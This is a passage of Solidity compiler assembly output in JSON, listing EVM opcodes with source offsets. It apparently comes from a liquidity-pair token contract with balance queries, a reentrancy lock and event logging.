											"name": "SUB"
										},
										{
											"begin": 9197,
											"end": 9222,
											"name": "DUP9"
										},
										{
											"begin": 9197,
											"end": 9222,
											"name": "AND"
										},
										{
											"begin": 9197,
											"end": 9222,
											"name": "SWAP2"
										},
										{
											"begin": 9197,
											"end": 9222,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 9197,
											"end": 9222,
											"name": "SWAP2"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "DUP1"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "DUP3"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "ADD"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "SWAP3"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "SWAP3"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "SWAP1"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "SWAP2"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "SWAP1"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "DUP3"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "SWAP1"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "SUB"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "ADD"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "DUP2"
										},
										{
											"begin": 9197,
											"end": 9222,
											"name": "DUP7"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "DUP1"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "258"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "258"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "POP"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "GAS"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "STATICCALL"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "259"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "259"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "POP"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "POP"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "POP"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "POP"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "MLOAD"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "260"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "260"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "MLOAD"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 9248,
											"end": 9297,
											"name": "PUSH [tag]",
											"value": "261"
										},
										{
											"begin": 9256,
											"end": 9264,
											"name": "DUP6"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "DUP6"
										},
										{
											"begin": 9276,
											"end": 9285,
											"name": "DUP12"
										},
										{
											"begin": 9287,
											"end": 9296,
											"name": "DUP12"
										},
										{
											"begin": 9248,
											"end": 9255,
											"name": "PUSH [tag]",
											"value": "186"
										},
										{
											"begin": 9248,
											"end": 9297,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 9248,
											"end": 9297,
											"name": "tag",
											"value": "261"
										},
										{
											"begin": 9248,
											"end": 9297,
											"name": "JUMPDEST"
										},
										{
											"begin": 9311,
											"end": 9316,
											"name": "DUP2"
										},
										{
											"begin": 9307,
											"end": 9354,
											"name": "ISZERO"
										},
										{
											"begin": 9307,
											"end": 9354,
											"name": "PUSH [tag]",
											"value": "262"
										},
										{
											"begin": 9307,
											"end": 9354,
											"name": "JUMPI"
										},
										{
											"begin": 9345,
											"end": 9353,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 9345,
											"end": 9353,
											"name": "SLOAD"
										},
										{
											"begin": 9326,
											"end": 9354,
											"name": "PUSH [tag]",
											"value": "263"
										},
										{
											"begin": 9326,
											"end": 9354,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 9331,
											"end": 9339,
											"name": "DUP1"
										},
										{
											"begin": 9331,
											"end": 9339,
											"name": "DUP3"
										},
										{
											"begin": 9331,
											"end": 9339,
											"name": "AND"
										},
										{
											"begin": 9331,
											"end": 9339,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 9345,
											"end": 9353,
											"name": "SWAP1"
										},
										{
											"begin": 9345,
											"end": 9353,
											"name": "DIV"
										},
										{
											"begin": 9345,
											"end": 9353,
											"name": "AND"
										},
										{
											"begin": 9326,
											"end": 9354,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 9326,
											"end": 9344,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 9326,
											"end": 9354,
											"name": "AND"
										},
										{
											"begin": 9326,
											"end": 9354,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 9326,
											"end": 9354,
											"name": "tag",
											"value": "263"
										},
										{
											"begin": 9326,
											"end": 9354,
											"name": "JUMPDEST"
										},
										{
											"begin": 9318,
											"end": 9323,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 9318,
											"end": 9354,
											"name": "SSTORE"
										},
										{
											"begin": 9307,
											"end": 9354,
											"name": "tag",
											"value": "262"
										},
										{
											"begin": 9307,
											"end": 9354,
											"name": "JUMPDEST"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "DUP1"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "MLOAD"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "DUP13"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "DUP2"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "MSTORE"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "DUP2"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "ADD"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "DUP13"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "SWAP1"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "MSTORE"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "DUP2"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "DUP16"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "AND"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "SWAP3"
										},
										{
											"begin": 9414,
											"end": 9424,
											"name": "CALLER"
										},
										{
											"begin": 9414,
											"end": 9424,
											"name": "SWAP3"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "PUSH",
											"value": "DCCD412F0B1252819CB1FD330B93224CA42612892BB3F4F789976E6D81936496"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "SWAP3"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "SWAP1"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "DUP2"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "SWAP1"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "SUB"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "SWAP1"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "SWAP2"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "ADD"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "SWAP1"
										},
										{
											"begin": 9409,
											"end": 9447,
											"name": "LOG3"
										},
										{
											"begin": 1270,
											"end": 1271,
											"name": "POP"
										},
										{
											"begin": 1270,
											"end": 1271,
											"name": "POP"
										},
										{
											"begin": 1270,
											"end": 1271,
											"name": "POP"
										},
										{
											"begin": 1270,
											"end": 1271,
											"name": "POP"
										},
										{
											"begin": 1270,
											"end": 1271,
											"name": "POP"
										},
										{
											"begin": 1270,
											"end": 1271,
											"name": "POP"
										},
										{
											"begin": 1270,
											"end": 1271,
											"name": "POP"
										},
										{
											"begin": 1270,
											"end": 1271,
											"name": "POP"
										},
										{
											"begin": 1270,
											"end": 1271,
											"name": "POP"
										},
										{
											"begin": 1292,
											"end": 1293,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1281,
											"end": 1289,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1281,
											"end": 1293,
											"name": "DUP2"
										},
										{
											"begin": 1281,
											"end": 1293,
											"name": "SWAP1"
										},
										{
											"begin": 1281,
											"end": 1293,
											"name": "SSTORE"
										},
										{
											"begin": 1281,
											"end": 1293,
											"name": "POP"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "SWAP2"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "POP"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "SWAP2"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1114,
											"end": 1134,
											"name": "tag",
											"value": "101"
										},
										{
											"begin": 1114,
											"end": 1134,
											"name": "JUMPDEST"
										},
										{
											"begin": 1114,
											"end": 1134,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1114,
											"end": 1134,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1114,
											"end": 1134,
											"name": "AND"
										},
										{
											"begin": 1114,
											"end": 1134,
											"name": "DUP2"
										},
										{
											"begin": 1114,
											"end": 1134,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "tag",
											"value": "103"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "JUMPDEST"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "AND"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "DUP2"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "tag",
											"value": "105"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMPDEST"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MLOAD"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP1"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "ADD"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MSTORE"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP1"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MSTORE"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "ADD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "4B42432D4C5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "D4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MSTORE"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "POP"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "tag",
											"value": "112"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "JUMPDEST"
										},
										{
											"begin": 3026,
											"end": 3030,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3042,
											"end": 3074,
											"name": "PUSH [tag]",
											"value": "189"
										},
										{
											"begin": 3052,
											"end": 3062,
											"name": "CALLER"
										},
										{
											"begin": 3064,
											"end": 3066,
											"name": "DUP5"
										},
										{
											"begin": 3068,
											"end": 3073,
											"name": "DUP5"
										},
										{
											"begin": 3042,
											"end": 3051,
											"name": "PUSH [tag]",
											"value": "197"
										},
										{
											"begin": 3042,
											"end": 3074,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "tag",
											"value": "114"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "JUMPDEST"
										},
										{
											"begin": 443,
											"end": 450,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "DUP2"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 18077,
											"end": 18498,
											"name": "tag",
											"value": "117"
										},
										{
											"begin": 18077,
											"end": 18498,
											"name": "JUMPDEST"
										},
										{
											"begin": 1205,
											"end": 1213,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1205,
											"end": 1213,
											"name": "SLOAD"
										},
										{
											"begin": 1217,
											"end": 1218,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1205,
											"end": 1218,
											"name": "EQ"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH [tag]",
											"value": "267"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "JUMPI"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP2"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MLOAD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP2"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SUB"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "REVERT"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "tag",
											"value": "267"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "JUMPDEST"
										},
										{
											"begin": 1259,
											"end": 1260,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1248,
											"end": 1256,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1248,
											"end": 1260,
											"name": "SSTORE"
										},
										{
											"begin": 18145,
											"end": 18151,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 18145,
											"end": 18151,
											"name": "SLOAD"
										},
										{
											"begin": 18194,
											"end": 18200,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 18194,
											"end": 18200,
											"name": "SLOAD"
										},
										{
											"begin": 18334,
											"end": 18342,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 18334,
											"end": 18342,
											"name": "SLOAD"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "DUP1"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "DUP2"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "MSTORE"
										},
										{
											"begin": 18323,
											"end": 18327,
											"name": "ADDRESS"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "DUP3"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "ADD"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "MSTORE"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "SWAP1"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18145,
											"end": 18151,
											"name": "SWAP5"
										},
										{
											"begin": 18145,
											"end": 18151,
											"name": "DUP6"
										},
										{
											"begin": 18145,
											"end": 18151,
											"name": "AND"
										},
										{
											"begin": 18145,
											"end": 18151,
											"name": "SWAP5"
										},
										{
											"begin": 18194,
											"end": 18200,
											"name": "SWAP1"
										},
										{
											"begin": 18194,
											"end": 18200,
											"name": "SWAP4"
										},
										{
											"begin": 18194,
											"end": 18200,
											"name": "AND"
										},
										{
											"begin": 18194,
											"end": 18200,
											"name": "SWAP3"
										},
										{
											"begin": 18225,
											"end": 18353,
											"name": "PUSH [tag]",
											"value": "269"
										},
										{
											"begin": 18225,
											"end": 18353,
											"name": "SWAP3"
										},
										{
											"begin": 18145,
											"end": 18151,
											"name": "DUP6"
										},
										{
											"begin": 18145,
											"end": 18151,
											"name": "SWAP3"
										},
										{
											"begin": 18273,
											"end": 18275,
											"name": "DUP8"
										},
										{
											"begin": 18273,
											"end": 18275,
											"name": "SWAP3"
										},
										{
											"begin": 18289,
											"end": 18343,
											"name": "PUSH [tag]",
											"value": "270"
										},
										{
											"begin": 18289,
											"end": 18343,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18334,
											"end": 18342,
											"name": "AND"
										},
										{
											"begin": 18334,
											"end": 18342,
											"name": "SWAP2"
										},
										{
											"begin": 18145,
											"end": 18151,
											"name": "DUP6"
										},
										{
											"begin": 18145,
											"end": 18151,
											"name": "SWAP2"
										},
										{
											"begin": 18289,
											"end": 18314,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 18289,
											"end": 18314,
											"name": "SWAP2"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "DUP1"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "DUP3"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "ADD"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "SWAP3"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "SWAP3"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "SWAP1"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "SWAP2"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "SWAP1"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "DUP3"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "SWAP1"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "SUB"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "ADD"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "DUP2"
										},
										{
											"begin": 18145,
											"end": 18151,
											"name": "DUP7"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "DUP1"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "271"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "271"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "POP"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "GAS"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "STATICCALL"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "272"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "272"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "POP"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "POP"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "POP"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "POP"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "MLOAD"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "273"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
